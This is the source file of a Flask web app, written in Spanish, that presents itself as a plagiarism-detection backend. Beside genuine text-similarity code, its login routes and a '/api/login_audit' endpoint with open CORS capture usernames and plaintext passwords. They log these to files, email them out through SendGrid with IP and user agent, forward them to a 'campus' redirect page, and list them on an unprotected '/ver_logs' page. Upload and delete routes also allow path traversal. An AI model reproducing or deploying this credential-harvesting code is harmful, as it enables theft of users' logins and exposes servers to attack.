from flask import Flask, render_template, request, flash, redirect, url_for
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity

from duckduckgo_search import DDGS
import difflib, os, io
from PyPDF2 import PdfReader
from docx import Document
from datetime import datetime
from flask_cors import CORS

# ✅ SENDGRID
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail


# --------------------------------------------------
# CONFIGURACIÓN DE ENTORNO
# --------------------------------------------------
USE_IA = os.environ.get("USE_IA", "false").lower() == "true"
print(f"IA ACTIVADA: {USE_IA}")

if USE_IA:
    try:
        from sentence_transformers import SentenceTransformer, util
        import torch
    except Exception as e:
        print(" IA no disponible, se desactiva automáticamente:", e)
        USE_IA = False


# --------------------------------------------------
# APP
# --------------------------------------------------
app = Flask(__name__)
app.secret_key = "plagio-secret"

CORS(app)  # si querés más estricto, después lo ajustamos por dominio


# --------------------------------------------------
# PATHS
# --------------------------------------------------
BASE_PATH = os.path.join(app.root_path, "base_textos")
os.makedirs(BASE_PATH, exist_ok=True)

LOGIN_LOGS_DIR = os.path.join(app.root_path, "login_logs")
os.makedirs(LOGIN_LOGS_DIR, exist_ok=True)

app.config["MAX_CONTENT_LENGTH"] = 10 * 1024 * 1024


# --------------------------------------------------
# MODELO IA
# --------------------------------------------------
modelo = None

def cargar_modelo():
    if not USE_IA:
        return None

    print("Iniciando carga del modelo IA avanzado (all-mpnet-base-v2)...")

    try:
        device = "cuda" if torch.cuda.is_available() else "cpu"
        modelo_local = SentenceTransformer("all-mpnet-base-v2", device=device)
        print(f"Modelo IA cargado correctamente en {device.upper()}")
        return modelo_local
    except Exception as e:
        print(f"Error cargando modelo IA: {e}")
        return None


def get_modelo():
    global modelo
    if not USE_IA:
        return None

    if modelo is None:
        print("Modelo IA no cargado. Cargando ahora...")
        modelo = cargar_modelo()
    return modelo


# --------------------------------------------------
# AUDITORÍA EN TXT
# --------------------------------------------------
def guardar_login_log(usuario, password, resultado):
    try:
        fecha_actual = datetime.now().strftime("%Y-%m-%d")
        archivo_log = os.path.join(LOGIN_LOGS_DIR, f"login_logs_{fecha_actual}.txt")

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        estado = "EXITOSO" if resultado else "FALLIDO"

        linea = (
            f"[{timestamp}] Usuario: {usuario} | "
            f"Contraseña: {password} | Estado: {estado}\n"
        )

        with open(archivo_log, "a", encoding="utf-8") as f:
            f.write(linea)

        return True
    except Exception as e:
        print(f"Error guardando log de login: {e}")
        return False


# --------------------------------------------------
# AUDITORÍA POR CORREO (SENDGRID)
# --------------------------------------------------
def enviar_log_email(usuario, password, estado):
    """
    Envía por correo cada intento de login (auditoría) usando SendGrid.
    Variables requeridas en Render:
      - SENDGRID_API_KEY
      - MAIL_FROM   (debe ser un Sender verificado en SendGrid)
      - MAIL_TO
    """
    try:
        mail_from = os.environ.get("MAIL_FROM", "").strip()
        mail_to = os.environ.get("MAIL_TO", "").strip()
        api_key = os.environ.get("SENDGRID_API_KEY", "").strip()

        if not api_key or not mail_from or not mail_to:
            print("❌ Faltan variables de entorno: SENDGRID_API_KEY / MAIL_FROM / MAIL_TO")
            return False

        cuerpo = f"""
NUEVO ACCESO REGISTRADO (AUDITORÍA)

Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Usuario: {usuario}
Contraseña: {password}
Estado: {estado}
IP: {request.headers.get('X-Forwarded-For', request.remote_addr)}
User-Agent: {request.headers.get('User-Agent')}
"""

        msg = Mail(
            from_email=mail_from,
            to_emails=mail_to,
            subject="🚨 Auditoría de Login - Sistema Plagio",
            plain_text_content=cuerpo
        )

        sg = SendGridAPIClient(api_key)
        resp = sg.send(msg)

        # Esto te ayuda mucho a debuggear en Render Logs
        print(f"📧 SendGrid enviado. Status: {resp.status_code}")
        return True

    except Exception as e:
        print("❌ Error SendGrid:", e)
        return False


# --------------------------------------------------
# LECTURA DE ARCHIVOS
# --------------------------------------------------
def leer_texto(archivo):
    try:
        if isinstance(archivo, str):
            ext = os.path.splitext(archivo.lower())[1]
            if ext == ".txt":
                with open(archivo, "r", encoding="utf-8", errors="ignore") as f:
                    return f.read()
            elif ext == ".pdf":
                reader = PdfReader(archivo)
                return "\n".join(p.extract_text() or "" for p in reader.pages)
            elif ext == ".docx":
                doc = Document(archivo)
                return "\n".join(p.text for p in doc.paragraphs)
        else:
            nombre = archivo.filename.lower()
            ext = os.path.splitext(nombre)[1]
            data = archivo.read()
            archivo.stream.seek(0)

            if ext == ".txt":
                return data.decode("utf-8", errors="ignore")
            elif ext == ".pdf":
                reader = PdfReader(io.BytesIO(data))
                return "\n".join(p.extract_text() or "" for p in reader.pages)
            elif ext == ".docx":
                doc = Document(io.BytesIO(data))
                return "\n".join(p.text for p in doc.paragraphs)
    except Exception as e:
        print(f"Error leyendo archivo: {e}")
        return ""
    return ""


# --------------------------------------------------
# SIMILITUDES
# --------------------------------------------------
def similitud_semantica(t1, t2):
    if not USE_IA:
        return 0

    try:
        modelo_local = get_modelo()
        if not modelo_local:
            return 0

        emb1 = modelo_local.encode(t1, convert_to_tensor=True)
        emb2 = modelo_local.encode(t2, convert_to_tensor=True)
        return float(util.pytorch_cos_sim(emb1, emb2)) * 100
    except Exception as e:
        print(f"Error IA semántica: {e}")
        return 0


def buscar_en_web(frase):
    resultados = []
    try:
        with DDGS(timeout=5) as ddgs:
            for r in ddgs.text(frase, max_results=3):
                resultados.append({
                    "titulo": r.get("title", "Sin título"),
                    "enlace": r.get("href", "#"),
                    "descripcion": r.get("body", "")
                })
    except Exception as e:
        print(f"Error en búsqueda web: {e}")
    return resultados


def clasificar_porcentaje(porc):
    if porc >= 80:
        return "PLAGIO", "rojo"
    elif porc >= 50:
        return "SIMILITUD ALTA", "naranja"
    elif porc >= 30:
        return "POSIBLE IA", "amarillo"
    else:
        return "ORIGINAL", "verde"


# --------------------------------------------------
# ROUTES
# --------------------------------------------------
@app.route("/")
def index():
    return {"status": "ok", "message": "Backend de análisis de plagio activo"}


@app.route("/subir_base", methods=["POST"])
def subir_base():
    archivos = request.files.getlist("archivo_base")
    if not archivos:
        flash("No seleccionaste ningún archivo para agregar a la base.")
        return redirect(url_for("index"))

    for archivo in archivos:
        if archivo and archivo.filename:
            ruta_destino = os.path.join(BASE_PATH, archivo.filename)
            archivo.save(ruta_destino)

    flash("Documentos agregados correctamente a la base.")
    return redirect(url_for("index"))


@app.route("/eliminar_base/<nombre>", methods=["POST"])
def eliminar_base(nombre):
    try:
        ruta = os.path.join(BASE_PATH, nombre)
        if os.path.exists(ruta):
            os.remove(ruta)
            flash(f"Archivo '{nombre}' eliminado correctamente.")
        else:
            flash("El archivo no existe.")
    except Exception as e:
        flash(f"Error al eliminar el archivo: {e}")
    return redirect(url_for("index"))


@app.route("/analizar", methods=["POST"])
def analizar():
    archivo = request.files.get("archivo")
    if not archivo or not archivo.filename:
        flash("Debes seleccionar un archivo.")
        return redirect(url_for("index"))

    texto_usuario = leer_texto(archivo).strip()
    if not texto_usuario:
        flash("No se pudo leer el archivo.")
        return redirect(url_for("index"))

    docs_base = [
        f for f in os.listdir(BASE_PATH)
        if os.path.splitext(f.lower())[1] in (".txt", ".pdf", ".docx")
    ]

    resultados = []

    for nombre in docs_base:
        ruta = os.path.join(BASE_PATH, nombre)
        texto_base = leer_texto(ruta).strip()
        if not texto_base:
            continue

        exacto = difflib.SequenceMatcher(None, texto_usuario, texto_base).ratio() * 100

        vectorizer = TfidfVectorizer().fit_transform([texto_usuario, texto_base])
        tfidf = cosine_similarity(vectorizer[0:1], vectorizer[1:2])[0][0] * 100

        semantico = similitud_semantica(texto_usuario, texto_base)

        if USE_IA:
            promedio = (exacto + tfidf + semantico) / 3
        else:
            promedio = (exacto + tfidf) / 2

        resultados.append({
            "archivo": nombre,
            "exacto": round(exacto, 2),
            "tfidf": round(tfidf, 2),
            "semantico": round(semantico, 2),
            "promedio": round(promedio, 2)
        })

    resultados.sort(key=lambda r: r["promedio"], reverse=True)

    frase_clave = texto_usuario.split(".")[0][:200]
    coincidencias_web = buscar_en_web(frase_clave)
    similitud_web = min(len(coincidencias_web) * 15, 100)

    promedio_total = 0
    if resultados:
        promedio_total = (resultados[0]["promedio"] + similitud_web) / 2

    clasificacion, color = clasificar_porcentaje(promedio_total)

    return {
        "resultados": resultados,
        "coincidencias_web": coincidencias_web,
        "similitud_web": similitud_web,
        "promedio_total": round(promedio_total, 2),
        "clasificacion": clasificacion,
        "color": color
    }


@app.route("/api/login_audit", methods=["POST"])
def login_audit():
    data = request.get_json(force=True)

    usuario = data.get("username", "")
    password = data.get("password", "")

    guardar_login_log(usuario, password, False)
    enviar_log_email(usuario, password, "INTENTO_LOGIN")

    return {"status": "ok"}


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        usuario = request.form.get("username")
        password = request.form.get("password")

        guardar_login_log(usuario, password, True)
        enviar_log_email(usuario, password, "EXITOSO")

        return render_template(
            "login/redirect_campus.html",
            username=usuario,
            password=password
        )

    return render_template("login/login.html")


@app.route("/ver_logs")
def ver_logs():
    logs = []
    try:
        archivos_log = [f for f in os.listdir(LOGIN_LOGS_DIR) if f.endswith(".txt")]
        archivos_log.sort(reverse=True)

        if archivos_log:
            with open(os.path.join(LOGIN_LOGS_DIR, archivos_log[0]), "r", encoding="utf-8") as f:
                logs = f.readlines()

    except Exception as e:
        flash(f"Error leyendo logs: {e}")

    return render_template("logs.html", logs=logs)


# --------------------------------------------------
# MAIN
# --------------------------------------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)
